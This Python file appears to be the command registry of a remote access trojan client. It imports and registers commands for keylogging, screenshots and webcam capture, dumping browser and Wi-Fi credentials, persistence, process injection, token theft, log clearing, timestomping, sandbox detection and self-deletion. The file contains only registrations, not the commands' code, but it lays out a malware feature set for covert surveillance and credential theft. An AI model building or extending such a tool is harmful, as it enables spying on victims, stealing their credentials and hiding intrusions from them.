from client.core.command_registry import CommandRegistry
from client.commands.file_commands import LsCommand, CdCommand, PwdCommand, RmCommand, MvCommand, CatCommand, TouchCommand
from client.commands.transfer_commands import UploadCommand, DownloadCommand
from client.commands.shell_commands import PsCommand, IfconfigCommand, KillCommand, PkillCommand, GrepCommand
from client.commands.system_commands import SysinfoCommand, CheckAdminCommand, ClipboardCommand
from client.commands.surveillance_commands import ScreenshotCommand, WebcamCommand
from client.commands.keylogger_commands import KeylogStartCommand, KeylogDumpCommand, KeylogStopCommand
from client.commands.credential_commands import WifiDumpCommand, BrowserCredsCommand
from client.commands.persistence_commands import PersistenceCommand
from client.commands.session_commands import QuitCommand, BackgroundCommand, HelpCommand, ClearCommand, TerminateCommand, SendallCommand
from client.commands.stealth_commands import (
    EvasionCommand, DetectVMCommand, InjectCommand, StealTokenCommand,
    RevertTokenCommand, WhoamiCommand, EnablePrivilegeCommand,
    ClearLogsCommand, TimestompCommand, SelfDeleteCommand,
)


def build_client_registry() -> CommandRegistry:
    registry = CommandRegistry()
    registry.register(LsCommand())
    registry.register(CdCommand())
    registry.register(PwdCommand())
    registry.register(RmCommand())
    registry.register(MvCommand())
    registry.register(CatCommand())
    registry.register(TouchCommand())
    registry.register(UploadCommand())
    registry.register(DownloadCommand())
    registry.register(PsCommand())
    registry.register(IfconfigCommand())
    registry.register(KillCommand())
    registry.register(PkillCommand())
    registry.register(GrepCommand())
    registry.register(SysinfoCommand())
    registry.register(CheckAdminCommand())
    registry.register(ClipboardCommand())
    registry.register(ScreenshotCommand())
    registry.register(WebcamCommand())
    registry.register(KeylogStartCommand())
    registry.register(KeylogDumpCommand())
    registry.register(KeylogStopCommand())
    registry.register(WifiDumpCommand())
    registry.register(BrowserCredsCommand())
    registry.register(PersistenceCommand())
    registry.register(QuitCommand())
    registry.register(BackgroundCommand())
    registry.register(HelpCommand())
    registry.register(ClearCommand())
    registry.register(TerminateCommand())
    registry.register(SendallCommand())
    registry.register(EvasionCommand())
    registry.register(DetectVMCommand())
    registry.register(InjectCommand())
    registry.register(StealTokenCommand())
    registry.register(RevertTokenCommand())
    registry.register(WhoamiCommand())
    registry.register(EnablePrivilegeCommand())
    registry.register(ClearLogsCommand())
    registry.register(TimestompCommand())
    registry.register(SelfDeleteCommand())
    return registry
